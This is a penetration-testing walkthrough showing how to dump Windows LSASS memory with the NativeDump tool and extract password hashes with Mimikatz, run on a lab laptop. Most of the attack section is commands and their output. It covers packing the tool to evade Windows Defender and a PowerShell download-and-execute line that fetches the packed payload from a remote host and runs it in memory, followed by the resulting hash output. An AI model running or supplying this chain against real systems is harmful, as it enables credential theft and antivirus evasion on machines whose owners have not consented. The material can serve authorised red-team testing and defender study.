==================================================================================================================================
OS Credential Dumping (LSASS) using 'NativeDump'
==================================================================================================================================

After a user logs on a Windows computer, the system generates and stores a variety of credential materials in LSASS process memory. 
Our objective is to extract the password hashes of the local and/or domain accounts stored in the memory of the Local Security 
Authority Subsystem Service (LSASS process) of a target Windows computer. 
A valid local or domain Windows account member of the 'local administrator' group is required for dumping the LSASS process.

> Usefull link: https://attack.mitre.org/techniques/T1003/001/

The tool NativeDump allows to dump the lsass process using only NTAPIs generating a Minidump file with only the streams needed to be parsed 
by tools like Mimikatz or Pypykatz (SystemInfo, ModuleList and Memory64List Streams).

Techniques used by NativeDump
------------------------------
+ NTOpenProcessToken and NtAdjustPrivilegeToken to get the "SeDebugPrivilege" privilege.
+ RtlGetVersion to get the Operating System version details (Major version, minor version and build number). 
  This is necessary for the SystemInfo Stream.
+ NtQueryInformationProcess and NtReadVirtualMemory to get the lsasrv.dll address. This is the only module necessary for the ModuleList Stream.
+ NtOpenProcess to get a handle for the lsass process.
+ NtQueryVirtualMemory and NtReadVirtualMemory to loop through the memory regions and dump all possible ones. 
  At the same time it populates the Memory64List Stream.

The project has three branches in addition to the main branch:
+ ntdlloverwrite - Overwrite ntdll.dll's ".text" section using a clean version from the DLL file already on disk
+ delegates 	   - Overwrite ntdll.dll + Dynamic function resolution + String encryption with AES + XOR-encoding
+ remote 	       - Overwrite ntdll.dll + Dynamic function resolution + String encryption with AES + Send file to remote machine + XOR-encoding

Github URLs
------------
> main branch	   - https://github.com/ricardojoserf/NativeDump
> delegates	     - https://github.com/ricardojoserf/NativeDump/tree/delegates
> ntdlloverwrite - https://github.com/ricardojoserf/NativeDump/tree/ntdlloverwrite
> remote 	       - https://github.com/ricardojoserf/NativeDump/tree/remote


======================================================================================================================
POC/Basic test - Dumping the LSASS memory of a Windows 10 laptop (fully patched with the Windows Defender AV enabled)
======================================================================================================================

----------------------------------------------------------------------------------------------------------------------
Step 1. Download and compile the tool's source code (main branch) with Visual Studio
----------------------------------------------------------------------------------------------------------------------

Source code: https://github.com/ricardojoserf/NativeDump

Build started...
1>------ Build started: Project: NativeDump, Configuration: Release x64 ------
1>  NativeDump -> C:\Users\pentester\Documents\Tools-Pentest\7-Password-Dump&Cracking\NativeDump-main\NativeDump\bin\x64\Release\NativeDump.exe
========== Build: 1 succeeded, 0 failed, 0 up-to-date, 0 skipped ==========
========== Build started at 5:18 PM and took 00.636 seconds ==========


----------------------------------------------------------------------------------------------------------------------
Step 2 - Pack the tool NativeDump to be able to avoid AV detection
----------------------------------------------------------------------------------------------------------------------

You need to pack the tool as it is flagged by most AV solutions such as Windows Defender.
Many packers can be used. For this test, I used one of my PowerShell packer to bypass Windows Defender.
To learn about AV bypass techniques please refer to the section 'Defense evasion (examples)' of this Github project.


----------------------------------------------------------------------------------------------------------------------
Step 3 - Download and execute (as local admin) the packed version of 'NativeDump' on a target Windows 10 laptop
----------------------------------------------------------------------------------------------------------------------

PS C:\temp> Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled, AntispywareEnabled, AntivirusEnabled, IsTamperProtected | FL

RealTimeProtectionEnabled : True
IoavProtectionEnabled     : True
AntispywareEnabled        : True
AntivirusEnabled          : True
IsTamperProtected         : True

PS C:\temp> whoami -priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled


PS C:\temp> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.144:8080/packed-nativedump.ps1');
True

PS C:\temp> Invoke-Packed-NET-Executable C:\temp\memfile
[+] Process PID:                                1000
[+] Process handle:                             3564
[+] Process_Basic_Information Address:          0x1BD6746A140
[+] PEB Address Pointer:                        0x1BD6746A148
[+] PEB Address:                                0x8D5CC88000
[+] InInitializationOrderModuleList:            0x7FF98849C4F0
[+] Lsasrv.dll Address:                         0x7FF9855C0000
[+] Lsasrv.dll Size:                            0x1A3000
[+] File C:\temp\memfile created.


PS C:\temp> dir

    Directory: C:\temp

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          5/4/2024   6:58 PM          23552 Audit.exe
-a----          5/4/2024   7:19 PM       59201946 memfile
<SNIP>

> Note: the output file named 'memfile' was not identified as a LSASS memory dump file and was not deleted by Windows Defender AV.


-------------------------------------------------------------------------------------------------------------------------------
Step 4 - Copy the LSASS memory dump file made with NativeDump on your attacker machine & extract the credentials with Mimikatz 
-------------------------------------------------------------------------------------------------------------------------------

mimikatz(commandline) # sekurlsa::minidump memfile.dmp
Switch to MINIDUMP : 'memfile.dmp'

mimikatz(commandline) # sekurlsa::LogonPasswords
Opening : 'memfile.dmp' file for minidump...

Authentication Id : 0 ; 752712 (00000000:000b7c48)
Session           : Interactive from 1
User Name         : auditor
Domain            : LAB
Logon Server      : DC1
Logon Time        : 5/4/2024 5:13:29 PM
SID               : S-1-5-21-666114207-261065646-224150901-1121
	msv :	
	 [00000003] Primary
	 * Username : auditor
	 * Domain   : LAB
	 * NTLM     : d4df92964dfc54523494f4a98<SNIP>
	 * SHA1     : 331b7ed8e19236296a44191a1<SNIP>
	 * DPAPI    : 48f657f
<SNIP>
